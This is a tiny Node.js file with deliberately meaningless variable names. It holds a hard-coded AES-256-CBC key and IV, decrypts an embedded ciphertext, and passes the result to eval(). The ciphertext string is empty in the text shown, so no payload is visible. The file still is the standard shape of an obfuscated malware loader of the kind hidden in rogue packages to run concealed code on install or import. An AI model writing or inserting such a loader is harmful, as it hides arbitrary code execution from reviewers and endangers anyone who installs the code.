const ito = require('crypto');
const itinho = Buffer.from('a3be126dad82c3748f1a3d5997e39b32e7e901fc6e6d3e8d8e60a59d2b9e5fee', 'hex');
const octua = Buffer.from('19592c75477b2ca49472a9ede92f5a70', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
